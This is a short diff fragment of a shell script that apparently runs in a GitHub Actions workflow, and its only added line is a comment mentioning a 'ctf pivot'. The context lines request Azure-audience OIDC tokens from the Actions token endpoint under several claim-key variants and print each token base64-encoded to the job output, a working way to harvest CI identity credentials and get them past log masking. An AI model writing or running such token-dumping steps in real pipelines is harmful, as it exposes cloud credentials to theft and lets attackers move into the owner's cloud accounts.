@@ -71,3 +71,4 @@ for SUFFIX in '&include_claim_keys=repo' '&include_claim_keys=repository_owner:r
   T=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange${SUFFIX}" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value", ""))')
   printf 'OIDC_ALT_B64='; printf %s "$T" | base64 -w0; echo
 done
+# ctf pivot refresh 1792647000
